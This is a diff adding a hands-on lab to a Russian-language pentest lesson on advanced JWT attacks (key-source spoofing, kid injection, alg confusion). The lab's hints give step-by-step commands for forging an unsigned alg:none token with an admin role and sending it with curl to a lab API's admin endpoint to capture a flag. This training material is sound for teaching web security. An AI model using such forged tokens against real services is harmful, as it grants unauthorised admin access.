@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "Продвинутые атаки на JWT: подмена источника ключа (jwk/jku/x5u), инъекция в kid, alg confusion и обход проверки подписи."
+lab:
+  kind: shell
+  title: "Практика: подделка JWT (alg:none)"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md, token.txt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Твой токен — в `token.txt`. Посмотри payload: `cut -d. -f2 token.txt | base64 -d`.
+    - Сервер не проверяет подпись: подойдёт `alg: none`. Закодируй заголовок: `echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0`.
+    - Закодируй payload с админской ролью: `echo -n '{"sub":"alice","role":"admin"}' | base64 -w0`.
+    - Задай части переменными и отправь: `export H=<hdr>` ; `export P=<pay>` ; `curl -s http://api.lab.local/v1/admin -H "Authorization: Bearer $H.$P." | cut -d: -f3 > found.txt`.
 ---
 
 В базовом уроке мы подбирали слабый секрет JWT и подделывали payload. Но что, если секрет стойкий? Тогда атакуют не секрет, а **механизм проверки подписи**. JWT-заголовок содержит не только `alg`, но и указатели на ключ — `jwk`, `jku`, `x5u`, `kid`. Если сервер доверяет этим полям, мы можем подсунуть **свой** ключ и подписать токен сами. Разберём эти атаки.
